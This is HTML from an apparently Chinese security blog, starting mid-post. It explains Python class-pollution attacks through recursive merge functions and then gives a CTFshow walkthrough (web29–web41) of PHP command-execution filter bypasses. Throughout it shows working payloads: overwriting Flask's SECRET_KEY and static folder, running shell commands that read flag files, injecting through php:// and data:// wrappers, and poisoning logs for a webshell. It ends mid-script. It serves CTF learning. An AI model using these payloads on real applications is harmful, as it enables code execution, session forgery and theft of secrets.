dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(father.secret)  <span class="comment"># hello</span></span><br><span class="line"><span class="built_in">print</span>(son_a.secret)  <span class="comment"># hello</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)  <span class="comment"># hello</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)  <span class="comment"># world</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)  <span class="comment"># world</span></span><br><span class="line"><span class="built_in">print</span>(father.secret)  <span class="comment"># world</span></span><br></pre></td></tr></table></figure><p>setattr函数如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">setattr</span>(<span class="params">x, y, v</span>): <span class="comment"># real signature unknown; restored from __doc__</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sets the named attribute on the given object to the specified value.</span></span><br><span class="line"><span class="string">    setattr(x, &#x27;y&#x27;, v) is equivalent to ``x.y = v&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>自动获取k和v之后(这里是secret和world), 完成<code>dst.k=v</code>的污染. 通过对子类的&quot;修改&quot;来改变父类的属性, 这样所有的继承都会变为这个变量</p><h1>获取目标类</h1><h2 id="获取父类"><a class="header-anchor" href="#获取父类">¶</a>获取父类</h2><p>例子中通过<code>__base__</code>属性查找到继承的父类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(father.secret)  <span class="comment"># hello</span></span><br><span class="line"><span class="built_in">print</span>(son_a.__class__)  <span class="comment"># &lt;class &#x27;type&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(son_a.__base__)  <span class="comment"># &lt;class &#x27;__main__.father&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="获取全局变量"><a class="header-anchor" href="#获取全局变量">¶</a>获取全局变量</h2><p><code>__init__</code>初始化方法作为类的一个内置方法, 在没有被重写作为函数的时候, 其数据类型会被当做装饰器, 特点就是都具有一个全局属性<code>__globals__</code>属性.</p><p><code>__globals__</code> 属性返回一个字典, 里面包含了函数定义时所在模块的全局变量</p><p>所以可以通过加上<code>globals</code>来获得和修改对应的全局变量</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    class1 = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">instance = A()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;a&quot;</span>:<span class="number">4</span>,</span><br><span class="line">            <span class="string">&quot;B&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;class1&quot;</span>:<span class="number">5</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(B.class1)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(B.class1)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># 2 1</span></span><br><span class="line"><span class="comment"># 5 4</span></span><br></pre></td></tr></table></figure><h2 id="获取其他模块"><a class="header-anchor" href="#获取其他模块">¶</a>获取其他模块</h2><h3 id="import加载"><a class="header-anchor" href="#import加载">¶</a>import加载</h3><p>你就把获取全局变量的变成另一个文件然后引入就好了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;demo&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;a&quot;</span>:<span class="number">4</span>,</span><br><span class="line">                <span class="string">&quot;B&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;class1:5</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="sys模块加载"><a class="header-anchor" href="#sys模块加载">¶</a>sys模块加载</h3><p>借助sys模块中的<code>__module__</code>属性, 这个属性能够加载出来在自运行开始所有已加载的模块, 从而我们能够从属性中获取到我们想要污染的目标模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;demo&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;a&quot;</span>:<span class="number">4</span>,</span><br><span class="line">                        <span class="string">&quot;B&quot;</span>:&#123;</span><br><span class="line">                            <span class="string">&quot;class1&quot;</span>:<span class="number">5</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="加载器loader获取sys"><a class="header-anchor" href="#加载器loader获取sys">¶</a>加载器loader获取sys</h3><p>loader加载器在python中的作用是为实现模块加载而设计的类, 其在<code>importlib</code>这一内置模块中有具体实现. 而<code>importlib</code>模块下所有的<code>py</code>文件中均引入了<code>sys</code>模块, 所以只需要获取loader就可以获取sys模块</p><p>获取方式如下: <code>loader.__init__.__globals__['sys']</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math </span><br><span class="line"><span class="built_in">print</span>(math.__loader__)</span><br></pre></td></tr></table></figure><h3 id="spec获取sys"><a class="header-anchor" href="#spec获取sys">¶</a>spec获取sys</h3><p>在python中还存在一个<code>__spec__</code>，包含了关于类加载时候的信息，它定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>中</p><p>获取方式: <code>&lt;模块名&gt;.__spec__.__init__.__globals__['sys']</code></p><h1>利用方式</h1><p>主要是替换关键内容, 比如密钥/验证密码等</p><h2 id="函数形参默认值替换"><a class="header-anchor" href="#函数形参默认值替换">¶</a>函数形参默认值替换</h2><p><code>__defaults__</code>是python中的一个<strong>元组</strong>, 用于存储函数或方法的默认参数值. 我们通过替换该属性, 来实现对函数位置或者是键值默认值替换</p><p><code>__kwdefaults__</code>是以<strong>字典</strong>形式来进行收录, 同样可以被替换</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># defaults</span></span><br><span class="line">payload_d = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;demo&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span> : (<span class="literal">True</span>,)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># kwdefaults</span></span><br><span class="line">payload_kwd = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;demo&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;shell&quot;</span> : <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="关键信息替换"><a class="header-anchor" href="#关键信息替换">¶</a>关键信息替换</h2><h3 id="flask密钥替换"><a class="header-anchor" href="#flask密钥替换">¶</a>flask密钥替换</h3><p>在不知道密钥(secret_key)的条件下进行session伪造需要能替换的手段, 这个就不错</p><p>如何替换还要看这个secret_key在哪里, 总之获取全局变量后, 可以通过<code>app.config[&quot;SECRET_KEY&quot;]</code>进行污染</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;SECRET_KEY&quot;</span> :<span class="string">&quot;apple&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="got-first-request"><a class="header-anchor" href="#got-first-request">¶</a>_got_first_request</h3><p>该值用于判定是否某次请求为自<code>Flask</code>启动后第一次请求, <code>_got_first_request</code>值为假时才会调用装饰器</p><p>所以如果我们想调用第一次访问前的请求，还想要在后续请求中进行使用的话，我们就需要将<code>_got_first_request</code>改成false然后就能够在后续访问的过程中，仍然能够调用装饰器</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_got_first_request&quot;</span>:<span class="literal">False</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="static-url-path"><a class="header-anchor" href="#static-url-path">¶</a>_static_url_path:</h3><p>当python指定了static静态目录以后，我们再进行访问就会定向到static文件夹下面的对应文件而不会存在目录穿梭的漏洞，但是如果我们想要访问其他文件下面的敏感信息，我们就需要污染这个静态目录，让他自动帮我们实现定向</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;./&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>其他</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(son_a.__base__)  </span><br><span class="line"><span class="comment"># 获取父类: &lt;class &#x27;__main__.father&#x27;&gt;  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(son_a.__base__))</span><br><span class="line"><span class="comment"># 获取父类的所有变量, 包括带下划线的</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">getattr</span>(son_a.__base__, <span class="string">&#x27;secret&#x27;</span>))</span><br><span class="line"><span class="comment"># 根据变量名（字符串 attr）动态获取父类中对应变量的值</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取父类所有变量</span></span><br><span class="line">father_attributes = [attr <span class="keyword">for</span> attr <span class="keyword">in</span> <span class="built_in">dir</span>(son_a.__base__) <span class="keyword">if</span> <span class="keyword">not</span> attr.startswith(<span class="string">&#x27;__&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅打印无下划线的部分</span></span><br><span class="line"><span class="built_in">print</span>(father_attributes)  <span class="comment"># [&#x27;secret&#x27;, &#x27;name&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 getattr 获取变量的值</span></span><br><span class="line"><span class="keyword">for</span> attr <span class="keyword">in</span> father_attributes:</span><br><span class="line">    value = <span class="built_in">getattr</span>(son_a.__base__, attr)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;attr&#125;</span>: <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/news/12518">浅谈Python原型链污染及利用方式</a></p><p><a href="https://xz.aliyun.com/news/14057">从CISCN2024的sanic引发对python“原型链”的污染挖掘</a></p>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_命令执行_1</title>
      <link href="/article/ctfshow-webbasic-rce-1/"/>
      <url>/article/ctfshow-webbasic-rce-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>命令执行</h1><hr><h2 id="web29"><a class="header-anchor" href="#web29">¶</a>web29</h2><ul><li>描述: 命令执行，需要严格的过滤</li></ul><p>仅仅过滤了flag,利用通配符绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload如下, 传递后查看源码即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;ls&#x27;);</span><br><span class="line">?c=system(&#x27;cat fla*&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web30"><a class="header-anchor" href="#web30">¶</a>web30</h2><ul><li>描述: 命令执行，需要严格的过滤</li></ul><p>过滤了system, php, 只需要换执行函数就可以了, 比如passthru</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload如下 传递后查看源码即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(ls);</span><br><span class="line">?c=passthru(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web31"><a class="header-anchor" href="#web31">¶</a>web31</h2><ul><li>描述: 同上</li></ul><p>cat, 空格, sort, shell, 点和单引号也过滤了, 同理可以换成tac等</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(ls);</span><br><span class="line">?c=passthru(&quot;tac%09f*&quot;);# 都行</span><br><span class="line">?c=echo%09`tac%09f*`;</span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>倒数第二个payload是获取文件和目录信息并且颠倒顺序, 获取颠倒顺序后的数组的第二个元素并显示该文件的php源代码</p></blockquote><h2 id="web32"><a class="header-anchor" href="#web32">¶</a>web32</h2><ul><li>描述: 同上</li></ul><p>过滤越来越多, echo, 反引号, 分号,左括号也过滤了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那就换成以<code>?&gt;</code>结尾的语句, 实在想不到怎么绕过还可以把本题变成文件包含</p><p>payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?c=$nice=include$_GET[&quot;url&quot;]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>还可以用data伪协议执行php代码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>可以包含日志文件进行写马</p></blockquote><h2 id="web33"><a class="header-anchor" href="#web33">¶</a>web33</h2><ul><li>描述: 同上</li></ul><p>过滤了双引号, 但是非常地可惜, 因为<code>$_GET[]$</code>去掉了双引号也可以用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web34"><a class="header-anchor" href="#web34">¶</a>web34</h2><ul><li>描述: 同上</li></ul><p>冒号也没了, 无所谓, 继续利用我们上一题payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="web35"><a class="header-anchor" href="#web35">¶</a>web35</h2><ul><li>描述: 同上</li></ul><p>真帅吧, 过滤<code>&lt;</code>和<code>=</code>, 但是您猜怎么着?我们是传参用的=而不是在参数内部用的=, 所以不会被过滤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web36"><a class="header-anchor" href="#web36">¶</a>web36</h2><ul><li>描述: 同上</li></ul><p>过滤<code>0-9</code>, payload没有, 继续梭哈, 这类题目就算进化到头了, payload同上</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="web37"><a class="header-anchor" href="#web37">¶</a>web37</h2><ul><li>描述: 同上</li></ul><p>似乎不是原来的题目了, 变为了文件包含类的文件执行, 仅包含了flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>伪协议加上通配符绕过过滤, 或者编码绕过也行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&#x27;cat fl*&#x27;)?&gt;</span><br><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></pre></td></tr></table></figure><p>还可以用UA头文件包含, nginx的默认日志位置为<code>/var/log/nginx/access.log</code></p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240703165620132.png" alt="image-20240703165620132"></p><p>进行日志包含, 用蚁剑连接, 得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240703165546051.png" alt="image-20240703165546051"></p><h2 id="web38"><a class="header-anchor" href="#web38">¶</a>web38</h2><ul><li>描述: 同上</li></ul><p>增加过滤<code>php</code>和<code>file</code>, 不知道啊, 我用data的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?=system(&#x27;tac f*)?&gt;</span><br><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br><span class="line">日志包含</span><br></pre></td></tr></table></figure><blockquote><p>短标签真不错, 有<code>&lt;?=...?&gt;</code>和<code>&lt;?...?&gt;</code>两种, 其中前一种是固定开放的</p></blockquote><h2 id="web39"><a class="header-anchor" href="#web39">¶</a>web39</h2><ul><li>描述: 同上</li></ul><p>限定后缀名, 一般是截断, 闭合或者是注释掉后面的内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&#x27;cat fl*&#x27;)?&gt;)?&gt;&lt;?php</span><br><span class="line">?c=data://text/plain,&lt;?php system(&#x27;cat fl*&#x27;)?&gt;# 问就是已经闭合了</span><br></pre></td></tr></table></figure><h2 id="web40"><a class="header-anchor" href="#web40">¶</a>web40</h2><ul><li>描述: 同上</li></ul><p>知道为什么括号那里看着这么宽吗, 因为是中文的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?c=session_start();system(session_id());</span><br><span class="line"></span><br><span class="line">还可以是  ?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">然后POST传参  b=system(&#x27;&#x27;tac flag.php)</span><br></pre></td></tr></table></figure><h2 id="web41"><a class="header-anchor" href="#web41">¶</a>web41</h2><ul><li>描述: 过滤不严，命令执行</li></ul><p>过滤了<code>$、+、-、^、~</code>使得异或自增和取反构造字符都无法使用了那就只能用<code>|</code>了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>构造脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">hex_i = <span class="string">&quot;&quot;</span></span><br><span class="line">hex_j = <span class="string">&quot;&quot;</span></span><br><span class="line">pattern = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/&#x27;</span></span><br><span class="line"><span class="comment"># 上面是写入题目的正则表达式</span></span><br><span class="line"></span><br><span class="line">str1 = [<span class="string">&quot;system&quot;</span>, <span class="string">&quot;cat flag.php&quot;</span>]</span><br><span class="line"><span class="comment"># 这是想要的到的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    t1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    t2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> str1[p]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> re.search(pattern, <span 